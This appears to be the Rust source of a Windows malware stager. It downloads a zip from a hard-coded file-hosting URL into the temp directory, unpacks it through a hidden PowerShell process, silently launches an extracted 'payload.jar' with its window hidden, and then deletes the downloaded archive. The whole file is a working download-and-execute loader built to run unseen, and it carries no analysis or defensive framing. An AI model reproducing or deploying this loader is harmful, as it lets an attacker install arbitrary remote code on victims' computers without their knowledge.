#![windows_subsystem = "windows"]

extern crate winapi;

use std::env;
use std::io::{Write};
use std::ffi::CString;
use std::error::Error;
use std::ptr::null_mut;
use std::path::{Path};
use std::fs::{File, remove_file};
use winapi::um::winuser::SW_HIDE;
use winapi::um::handleapi::CloseHandle;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::processthreadsapi::{CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION};

const BUFFER_SIZE: usize = 4096;

fn exec_shell(command: &str) -> Result<(), Box<dyn Error>> {
    unsafe {
        let mut si: STARTUPINFOA = std::mem::zeroed();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        si.dwFlags = 1;
        si.wShowWindow = SW_HIDE as u16;

        let full_command = format!("powershell.exe -Command \"{}\"", command);
        let c_command = CString::new(full_command)?;

        let success = CreateProcessA(
            null_mut(),
            c_command.as_ptr() as *mut i8,
            null_mut(),
            null_mut(),
            0,
            0,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        );

        if success == 0 {
            let error_code = std::io::Error::last_os_error();
            return Err(Box::new(error_code));
        }

        WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        Ok(())
    }
}

fn download_file(url: &str, output_file: &str) -> Result<(), Box<dyn Error>> {
    let response = reqwest::blocking::get(url)?;

    if !response.status().is_success() {
        return Err(format!("Failed to download file: {}", response.status()).into());
    }

    let mut file = File::create(output_file)?;    
    let reader = response.bytes()?;

    for chunk in reader.chunks(BUFFER_SIZE) {
        file.write_all(chunk)?;
    }

    Ok(())
}

fn unzip_and_extract(zip_file: &str, output_dir: &str) -> Result<(), Box<dyn Error>> {
    let extract_command = format!("Expand-Archive -Path \"{}\" -DestinationPath \"{}\"", zip_file, output_dir);
    exec_shell(&extract_command)
}

fn delete_directory(dir: &str) -> Result<(), Box<dyn Error>> {
    if Path::new(dir).exists() {
        std::fs::remove_dir_all(dir)?;
    }
    Ok(())
}

fn exec_jar_silent(jar_path: &str) -> Result<(), Box<dyn Error>> {
    unsafe {
        let mut si: STARTUPINFOA = std::mem::zeroed();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        si.dwFlags = 1;
        si.wShowWindow = SW_HIDE as u16;

        let command = format!("java -jar \"{}\"", jar_path);
        let c_command = CString::new(command)?;

        let success = CreateProcessA(
            null_mut(),
            c_command.as_ptr() as *mut i8,
            null_mut(),
            null_mut(),
            0,
            0,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        );

        if success == 0 {
            let error_code = std::io::Error::last_os_error();
            return Err(Box::new(error_code));
        }

        WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        Ok(())
    }
}

fn main() -> Result<(), Box<dyn Error>> {
    let file_url = "https://files.catbox.moe/177wm9.zip";
    let temp_dir = env::temp_dir();
    let output_file = temp_dir.join("stager.zip");
    let unzip_dir = temp_dir.join("waiting");

    if unzip_dir.exists() {
        delete_directory(unzip_dir.to_str().unwrap())?;
    }

    download_file(file_url, output_file.to_str().unwrap())?;
    unzip_and_extract(output_file.to_str().unwrap(), unzip_dir.to_str().unwrap())?;

    let stage_file = unzip_dir.join("payload.jar");

    println!("Ruta del archivo JAR: {}", stage_file.to_str().unwrap());

    exec_jar_silent(stage_file.to_str().unwrap())?;
    remove_file(output_file)?;

    Ok(())
}
